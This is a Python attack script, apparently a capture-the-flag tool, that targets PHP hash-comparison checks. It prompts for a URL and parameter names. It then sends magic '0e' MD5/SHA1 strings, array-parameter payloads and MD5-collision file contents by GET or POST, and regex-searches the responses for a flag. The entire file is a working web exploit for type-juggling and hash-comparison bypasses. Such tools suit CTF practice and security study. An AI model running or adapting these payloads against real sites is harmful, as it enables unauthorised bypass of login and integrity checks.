#coding:utf-8
import requests
import urllib 
import re

print('''
   ___ _____  ___              ___ ____  
  / __\__   \/ __\    /\/\    /   \ ___| 
 / /    / /\/ _\____ /    \  / /\ /___ \ 
/ /___ / / / /|_____/ /\/\ \/ /_// ___) |
\____/ \/  \/       \/    \/___,' |____/ 
md5attack:  [+]0e    [+]Array   [+]Collision
''')

'''
cmd的MD5获取----CertUtil -hashfile white.jpg.coll MD5
'''
urlString1=''
urlString2 = ''
urlString3 = ''
urlString1 = open('1','rb').read()
urlString2 = open('2','rb').read()
urlString3 = open('3','rb').read()

url = input("url:")#url='http://101.132.147.70:8400/md5-1/index.php'
S = requests.Session()
b=input('md5 or sh1:')#b='md5'
c=input('GET OR POST:')#c='GET'
rex=input('Flag format:')#rex='cnss'
a=input('data:')#a='3'
strlist = [rex,'{.*}']
reb=''.join(strlist)

i=0
b1 = '111'
b2 = '222'
b3 = '333'
c1=urlString1
c2=urlString2
c3=urlString3
z=['a','b','c','b','c','b','c','b','c','b','c','b','c']

if b=="md5":
	a1 = 'QNKCDZO'
	a2 = '240610708'
	a3 = 's878926199a'
else:
	a1 = 'aaroZmOk'
	a2 = 'aaK1STfY'
	a3 = 'aaO8zKZF'

for i in range(0,int(a)):
	z[i]=input("GET or POST参数"+str(i+1)+":")
data1 = {z[0]:a1,z[1]:a2,z[2]:a3}
data2 = {z[0]+'[]':b1,z[1]+'[]':b2,z[2]+'[]':b3}
data3 = {z[0]:c1,z[1]:c2,z[2]:c3}

if  c=="GET":
	print("+++++++++++++++++++++++++")
	r = S.get(url,params = data1)
	print("[+]0e:%s"%r.text)
	print("+++++++++++++++++++++++++")
	r1 = S.get(url,params = data2)
	print("[+]Array:%s"%r1.text)
	print("+++++++++++++++++++++++++")
	r2 = S.get(url,params= data3)
	print("[+]Collision:%s"%r2.text)
	print("+++++++++++++++++++++++++")
elif  c=="POST":
	r = S.post(url,data = data1)
	print("+++++++++++++++++++++++++")
	print("[+]0e:%s"%r.text)
	print("+++++++++++++++++++++++++")
	r1 = S.post(url,data = data2)
	print("[+]Array:%s"%r1.text)
	print("+++++++++++++++++++++++++")
	r2 = S.post(url,data= data3)
	print("[+]Collision:%s"%r2.text)
	print("+++++++++++++++++++++++++")
	
z=str(r.text)
z1=str(r1.text)
z2=str(r2.text)
flag = re.search(reb, z)
flag1 = re.search(reb, z1)
flag2 = re.search(reb, z2)

if flag:
	print("[+]hi,flag in 0e:",flag.group())
else:
	print("sorry,flag not in 0e")
if flag1:
	print("[+]hi,flag in Array:",flag1.group())
else:
	print("sorry,flag not in Array")
if flag2:
	print("[+]hi,flag in Collision:",flag2.group())
else:
	print("sorry,flag not Collision")
